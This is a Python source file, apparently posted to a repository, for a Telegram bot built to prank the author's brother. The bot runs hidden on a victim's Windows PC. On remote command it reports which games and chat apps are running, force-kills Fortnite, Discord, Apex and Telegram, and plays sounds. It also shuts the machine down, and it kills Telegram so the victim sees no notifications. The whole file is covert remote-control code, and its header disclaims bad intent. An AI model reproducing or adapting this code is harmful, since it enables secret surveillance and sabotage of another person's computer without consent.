# IMPORTANT
# This code is ugly. It just had to work. You can make it better.
# I made this telegram bot to prank my brother (https://www.youtube.com/watch?v=BOkSupPtWCQ)
# I changed some parts to ********************** for privacy reasons
# If you know a bit of coding you will realize it's an extremely easy program. If you don't know coding learn it
# and then come back.
# --------------------------------------------------------------------------------------------------------------------
# !!! THIS IS A MESSAGE FROM THE CREATOR OF THE REPOSITORY (me, iThinkAle): THIS PROGRAM IS NOT MADE BY ME.
# THIS PROGRAM IS MADE BY DAVID ALESSANDRINI, THE GUY THAT PRANKED HIS BROTHER IN THE VIDEO LINKED ABOVE.
# THE GUYS IN THE VIDEO LINKED ABOVE ARE NOT RELATED TO ME IN ANY WAY.
# THIS PROGRAM IS LINKED IN THE VIDEO COMMENT SECTION.
# THIS PROGRAM IS NOT MINE AND IS INTENDET FOR EDUCATIONAL AND ENTERTAINMENT PURPOSES ONLY.
# DO NOT USE THIS PROGRAM WITH BAD INTENTIONS.




import telepot
import os
import psutil
from pygame import mixer
import time
import socket
from telepot.loop import MessageLoop
from telepot.namedtuple import ReplyKeyboardMarkup

def greensquare():
    return u'\U00002705'
def redsquare():
    return u'\U0000274C'
def playglitch():
    mixer.init()
    mixer.music.load('C:\dev\watchdog\sound.mp3')
    mixer.music.play()
def davidid():
    return **********************
def davidusername():
    return "**********************"
def bottoken():
    return "**********************"

def notifytelegrampoint():
    bot.sendMessage(davidid(), '.')

def waitforinternetconnection():
    try:
        host = socket.gethostbyname("www.google.com")
        s = socket.create_connection((host, 80), 2)
        return True
    except:
        pass
    return False

def checkifprocessrunning(processname):
    '''
    Check if there is any running process that contains the given name processName.
    '''
    # Iterate over the all the running process
    for proc in psutil.process_iter():
        try:
            # Check if process name contains the given name string.
            if processname.lower() in proc.name().lower():
                return True
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass
    return False

def killfortnite(): #kill fortnite process
    if fortniterunning():
        os.system("taskkill /f /im FortniteClient-Win64-Shipping.exe")

def fortniterunning():
    return checkifprocessrunning("FortniteClient-Win64-Shipping.exe")

def killfortnitelauncher(): #kill fortnite launcher process
    if fortnitelauncherrunning():
        os.system("taskkill /f /im EpicGamesLauncher.exe")

def fortnitelauncherrunning():
    return checkifprocessrunning("EpicGamesLauncher.exe")

def killtelegram():
    if telegramrunning():
        os.system("taskkill /f /im Telegram.exe")

def telegramrunning():
    return checkifprocessrunning("Telegram.exe")

def killdiscord():
    if discordrunning():
        os.system("taskkill /f /im Discord.exe")

def discordrunning():
    return checkifprocessrunning("Discord.exe")

def apexrunning():
    return checkifprocessrunning("r5apex.exe")

def killapex():
    if apexrunning():
        os.system("taskkill /f /im r5apex.exe")

def killall():
    killfortnitelauncher()
    killfortnite()
    killtelegram()
    killdiscord()
    killapex()


def updateuser():
    killtelegram() #prevent user seeing message on desktop

    if fortnitelauncherrunning():
        bot.sendMessage(davidid(), "FL" + greensquare())
    else:
        bot.sendMessage(davidid(), "FL" + redsquare())

    if fortniterunning():
        bot.sendMessage(davidid(), "F" + greensquare())
    else:
        bot.sendMessage(davidid(), "F" + redsquare())

    if discordrunning():
        bot.sendMessage(davidid(), "D" + greensquare())
    else:
        bot.sendMessage(davidid(), "D" + redsquare())

    if apexrunning():
        bot.sendMessage(davidid(), "A" + greensquare())
    else:
        bot.sendMessage(davidid(), "A" + redsquare())

def shutdownpc():
    os.system('shutdown -s -t 0')

def handle(msg): #what to do if new message is received
    contenttype, chattype, chatid = telepot.glance(msg)
    text = msg['text'].upper()
    if not (chatid == **********************):
        bot.sendMessage(chatid, "WHO ARE YOU?! I WILL TELL MY MASTER")
        bot.sendMessage(davidid(), 'Someone contacted me! Here is the information:\n' + msg)
    elif text == 'KILL' or text == 'KILLALL' or text == 'KILL ALL' or text == 'KA':
        killall()
        notifytelegrampoint()
    elif text == 'KILL FORTNITE' or text == 'KF' or text == 'K':
        killtelegram()
        killfortnite()
        killfortnitelauncher()
        notifytelegrampoint()
    elif text == 'UPDATE' or text == 'U':
        updateuser()
    elif text == '/START':
        bot.sendMessage(davidid(), "Welcome back Master", reply_markup=keyboard)
    elif text == 'SHUTDOWN':
        bot.sendMessage(davidid(), "Shutting down. Bye Bye")
        shutdownpc()
    elif text == 'KILL ALL WITH REACTION' or text == 'KAWR':
        killall()
        notifytelegrampoint()
        bot.sendMessage(davidid(), "Reaction still not implemented")
    elif text == 'KIM':
        time.sleep(60)
        killall()
        notifytelegrampoint()
    elif text == 'KITENS':
        time.sleep(10)
        killall()
        notifytelegrampoint()
    elif text == 'S':
        playglitch()
        notifytelegrampoint()
    else:
        bot.sendMessage(davidid(), "I don't understand...", reply_markup=keyboard)

time.sleep(120)
waitforinternetconnection()
bot = telepot.Bot(bottoken())
MessageLoop(bot, handle).run_as_thread()
keyboard = ReplyKeyboardMarkup(keyboard=[['KA', 'U'], ['KF', 'KAWR'], ['KIM', 'KITENS']])
bot.sendMessage(davidid(), 'wO.Ow', reply_markup=keyboard)
while 1:
    time.sleep(10)